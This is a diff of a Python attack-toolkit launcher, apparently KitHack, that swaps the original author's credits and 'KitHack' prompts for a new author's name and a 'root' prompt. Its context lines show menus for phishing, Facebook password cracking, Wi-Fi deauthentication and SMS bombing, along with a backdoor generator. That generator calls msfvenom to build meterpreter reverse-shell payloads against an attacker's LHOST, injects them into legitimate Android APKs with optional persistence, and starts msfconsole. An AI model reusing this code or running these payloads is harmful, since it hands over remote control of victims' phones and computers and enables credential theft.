@@ -1,9 +1,10 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
-#Copyright 2021 KITHACK
-#Written by: Adrian Guillermo
-#Facebook: https://facebook.com/adrian.guillermo.22
-#Github: https://github.com/AdrMXR
+#Copyright 2024 Milki 1557
+#Written by: Milki1557_
+#Telegram: Milki1557
+
+# Installer Milk Tools
 
 BLUE, RED, WHITE, CYAN, DEFAULT, YELLOW, MAGENTA, GREEN, END, BOLD = '\33[94m', '\033[91m', '\33[97m', '\033[36m', '\033[0m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m', '\033[1m'
 
@@ -43,23 +44,23 @@ def check_permissions():
 
 def info():
 	os.system('clear')
-	print("{0}[VERSION]:{1} 1.3.2\n\n".format(RED, DEFAULT))
+	print("{0}[VERSION]:{1} 1.0\n\n".format(RED, DEFAULT))
 	time.sleep(0.5)
-	print("{0}[AUTOR]:{1} Adrian Guillermo\n\n".format(RED, DEFAULT))
+	print("{0}[AUTOR]:{1} Milki1557\n\n".format(RED, DEFAULT))
 	time.sleep(0.5)
-	print("{0}[GITHUB]:{1} https://www.github.com/AdrMXR\n\n".format(RED, DEFAULT))
+	print("{0}[Telegram]:{1} Milki1557".format(RED, DEFAULT))
 	time.sleep(0.5)
-	print("{0}[FACEBOOK]:{1} https://www.facebook.com/adrian.Guillermo.22\n\n".format(RED, DEFAULT))
+	print("{0}[Facebook]:{1} Milki Live".format(RED, DEFAULT))
 	time.sleep(0.5)
-	print("{0}[INSTAGRAM]:{1} https://www.instagram.com/adrian.guillermo22\n\n".format(RED, DEFAULT))	
+	print("{0}[INSTAGRAM]:{1} Milki1557_".format(RED, DEFAULT))	
 	time.sleep(0.5)
-	print("{0}[YOUTUBE]:{1} https://www.youtube.com/channel/UCqEtxJKbIghx6lyymrjfvnA\n".format(RED, DEFAULT))
+	print("{0}[Whatsapp]:{1} Private".format(RED, DEFAULT))
 	time.sleep(2.5)
 	os.system('clear')
 
 def main():
 	print(start_main_menu)
-	option = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+	option = input("{0}root >> {1}".format(RED, DEFAULT))
 	option = option.zfill(2)
 	
 	if option == '01':
@@ -77,7 +78,7 @@ def main():
 		print ('{0}10){1} Androidpatternlock  {2}Permite obtener el patrón de bloqueo en dispositivos Android.'.format(WHITE, YELLOW, DEFAULT))
 		print ('{0} 0){1} Back'.format(WHITE, YELLOW))
 
-		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+		tool = input("{0}root >> {1}".format(RED, DEFAULT))
 		tool = tool.zfill(2)
 		
 		if tool == '00':
@@ -138,7 +139,7 @@ def main():
 		print ('{0}13){1} Windows-Exploits        {2}Coleccion de Exploits Windows.'.format(WHITE, YELLOW, DEFAULT))
 		print ('{0} 0){1} Back'.format(WHITE, YELLOW))
 
-		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+		tool = input("{0}root >> {1}".format(RED, DEFAULT))
 		tool = tool.zfill(2)
 		
 		if tool == '00':
@@ -206,7 +207,7 @@ def main():
 		print ('{0}11){1} AIOPhish     {2}Herramienta phishing con diferentes opciones.'.format(WHITE, YELLOW, DEFAULT))
 		print ('{0} 0){1} Back'.format(WHITE, YELLOW))
 
-		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+		tool = input("{0}root >> {1}".format(RED, DEFAULT))
 		tool = tool.zfill(2)
 		
 		if tool == '00':
@@ -277,7 +278,7 @@ def main():
 		print ('{0}20){1} KawaiiDeauther {2}Bloquea todos los clientes/enrutadores wifi.'.format(WHITE, YELLOW, DEFAULT))
 		print ('{0} 0){1} Back'.format(WHITE, YELLOW))
 
-		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+		tool = input("{0}root >> {1}".format(RED, DEFAULT))
 		tool = tool.zfill(2) 
 		
 		if tool == '00':
@@ -368,7 +369,7 @@ def main():
 		print ('{0}13){1} Fb-Hack         {2}Script de recuperación y pirateo de contraseña de Facebook.'.format(WHITE, YELLOW, DEFAULT))
 		print ('{0} 0){1} Back'.format(WHITE, YELLOW))
 
-		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+		tool = input("{0}root >> {1}".format(RED, DEFAULT))
 		tool = tool.zfill(2)
 		
 		if tool == '00':
@@ -441,7 +442,7 @@ def main():
 		print ('{0}16){1} Phpsploit    {2}Herramienta capaz de mantener el acceso a un servidor web comprometido.'.format(WHITE, YELLOW, DEFAULT))
 		print ('{0} 0){1} Back'.format(WHITE, YELLOW))
 
-		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+		tool = input("{0}root >> {1}".format(RED, DEFAULT))
 		tool = tool.zfill(2)
 		
 		if tool == '00':
@@ -513,7 +514,7 @@ def main():
 		print ('{0}06){1} GODKILLER     {2}SMS-BOMBER y SMS-SENDER.'.format(WHITE, YELLOW, DEFAULT))
 		print ('{0} 0){1} Back'.format(WHITE, YELLOW))
 
-		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+		tool = input("{0}root >> {1}".format(RED, DEFAULT))
 		tool = tool.zfill(2)
 
 		if tool == '00':
@@ -569,7 +570,7 @@ def main():
 		print ('{0}20){1} DeadTrap       {2}Herramienta OSINT para rastrear huellas de un número de teléfono.'.format(WHITE, YELLOW, DEFAULT))
 		print ('{0} 0){1} Back'.format(WHITE, YELLOW))
 
-		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+		tool = input("{0}root >> {1}".format(RED, DEFAULT))
 		tool = tool.zfill(2)
 		
 		if tool == '00':
@@ -674,7 +675,7 @@ def main():
 		print ('{0}27){1} Venom                   {2}Generador/compilador/controlador de shellcode (metasploit).'.format(WHITE, YELLOW, DEFAULT))
 		print ('{0} 0){1} Back'.format(WHITE, YELLOW))
 
-		tool = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+		tool = input("{0}root >> {1}".format(RED, DEFAULT))
 		tool = tool.zfill(2)
 		
 		if tool == '00':
@@ -784,7 +785,7 @@ def main():
 		print ('{0}[09] {1}RUN MSFCONSOLE {0}'.format(WHITE, YELLOW))
 		print ('{0} [0] {1}Back'.format(WHITE, YELLOW))
 
-		sys = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+		sys = input("{0}root >> {1}".format(RED, DEFAULT))
 		sys = sys.zfill(2)
 
 		if sys == '00':
@@ -806,7 +807,7 @@ def main():
 			print ('{0}[11]{1} linux/x86/shell_bind_tcp'.format(WHITE, YELLOW))
 			print ('{0}[12]{1} linux/x86/shell_reverse_tcp'.format(WHITE, YELLOW))
 
-			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+			pay = input("{0}root >> {1}".format(RED, DEFAULT))
 			pay = pay.zfill(2)
 			
 			if pay == '01':
@@ -821,7 +822,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()
 					else:						
@@ -854,7 +855,7 @@ def main():
 				location = os.getcwd()	
 				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()
 					else:
@@ -887,7 +888,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()
 					else:
@@ -920,7 +921,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()
 					else:
@@ -953,7 +954,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()
 					else:
@@ -986,7 +987,7 @@ def main():
 				location = os.getcwd()	
 				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()
 					else:
@@ -1019,7 +1020,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()
 					else:
@@ -1052,7 +1053,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()
 					else:
@@ -1085,7 +1086,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()
 					else:
@@ -1118,7 +1119,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()
 					else:
@@ -1151,7 +1152,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()
 					else:
@@ -1184,7 +1185,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()
 					else:
@@ -1229,7 +1230,7 @@ def main():
 			print ('{0}[13]{1} windows/powershell_reverse_tcp'.format(WHITE, YELLOW))
 			print ('{0}[14]{1} windows/shell_reverse_tcp'.format(WHITE, YELLOW))
 
-			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+			pay = input("{0}root >> {1}".format(RED, DEFAULT))
 			pay = pay.zfill(2)
 
 			if pay == '01':
@@ -1244,7 +1245,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()
 					else:
@@ -1277,7 +1278,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()
 					else:
@@ -1310,7 +1311,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()
 					else:
@@ -1343,7 +1344,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()
 					else:
@@ -1376,7 +1377,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()
 					else:
@@ -1409,7 +1410,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()
 					else:
@@ -1442,7 +1443,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()
 					else:
@@ -1475,7 +1476,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()
 					else:
@@ -1508,7 +1509,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()
 					else:
@@ -1541,7 +1542,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()
 					else:
@@ -1574,7 +1575,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()
 					else:
@@ -1607,7 +1608,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()
 					else:
@@ -1640,7 +1641,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()
 					else:
@@ -1673,7 +1674,7 @@ def main():
 				location = os.getcwd()
 				if os.stat('output/{}.exe'.format(mainout)).st_size != 0:					
 					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.exe".format(GREEN, DEFAULT, location, mainout))	
-					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 						os.system('systemctl stop postgresql && clear')
 						main()	
 					else:
@@ -1711,7 +1712,7 @@ def main():
 			print ('{0}[06]{1} android/shell/reverse_https'.format(WHITE, YELLOW))
 			print ('{0}[07]{1} android/shell/reverse_tcp'.format(WHITE, YELLOW))
 
-			pay = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+			pay = input("{0}root >> {1}".format(RED, DEFAULT))
 			pay = pay.zfill(2)
 
 			if pay == '01':
@@ -1719,14 +1720,14 @@ def main():
 				print ('{0}[01]{1} APK MSF'.format(WHITE, YELLOW))
 				print ('{0}[02]{1} APK ORIGINAL'.format(WHITE, YELLOW))
 				
-				a = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+				a = input("{0}root >> {1}".format(RED, DEFAULT))
 				a = a.zfill(2)
 				
 				if a == '01':
 					run_network()
 					LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 					LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
-					while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
+					while input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
 						break
 					else:
 						Tk().withdraw()
@@ -1734,7 +1735,7 @@ def main():
 						print("\n{0}ICON: {1}".format(YELLOW, icon))
 						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))					
 						mainout = os.path.splitext(OUT)[0]	
-						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
+						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT))
 						file = open("/tmp/data.txt", "w")
 						file.write(icon + '\n')
 						file.write(mainout)
@@ -1769,7 +1770,7 @@ def main():
 							time.sleep(4)
 							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')
 							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
-							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 								os.system('systemctl stop postgresql && clear')
 								main()	
 							else:
@@ -1794,7 +1795,7 @@ def main():
 					# Salida de bucle
 					OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))					
 					mainout = os.path.splitext(OUT)[0]
-					var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
+					var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT))
 					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 					time.sleep(4)
 					os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_http LHOST={0} LPORT={1} R > output/{2}.apk'.format(LHOST, LPORT, mainout))																				
@@ -1808,7 +1809,7 @@ def main():
 							print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
 							break						
 						print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
-						if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 							os.system('systemctl stop postgresql && clear')
 							main()	
 						else:
@@ -1834,7 +1835,7 @@ def main():
 					print ('{0}[01]{1} Use the old Metasploit method'.format(WHITE, YELLOW))
 					print ('{0}[02]{1} Use the new KitHack method'.format(WHITE, YELLOW))
 
-					m = input("{0}KitHack >> {1}".format(RED, DEFAULT))
+					m = input("{0}root >> {1}".format(RED, DEFAULT))
 					m = m.zfill(2)
 
 					if m == '01':
@@ -1846,7 +1847,7 @@ def main():
 						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
 						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
 						mainout = os.path.splitext(OUT)[0]
-						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
+						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT))
 						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
 						time.sleep(4)
 						os.system('systemctl start postgresql && msfvenom -x {0} -p android/meterpreter_reverse_https LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
@@ -1860,7 +1861,7 @@ def main():
 								print("{0}File: {1}/output/{2}.sh".format(DEFAULT, location, mainout))	
 								break							
 							print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
-							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+							if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
 								os.system('systemctl stop postgresql && clear')
 								main()	
 							else:
@@ -1890,7 +1891,7 @@ def main():
 						print("\n{0}APK ORIGINAL: {1}".format(YELLOW, APK))
 						OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
 						mainout = os.path.splitext(OUT)[0]
-						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT))
+						var = input("\n{0}[!] ¿Desea crear persistencia a su APK? (y/n)\n{1}root >> {2}".format(GREEN, RED, DEFAULT))
 						print("\n{0}[*] Generating payload...{1}".format(GREEN, DEFAULT))	
 						time.sleep(4)
 						os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_http LPORT={0} LHOST={1} R > output/payload.apk'.format(LPORT, LHOST))
@@ -1924,7 +1925,7 @@ def main():
 							time.sleep(4)
 							os.system('rm -rf output/original output/payload output/original.apk output/payload.apk output/kithack.apk')
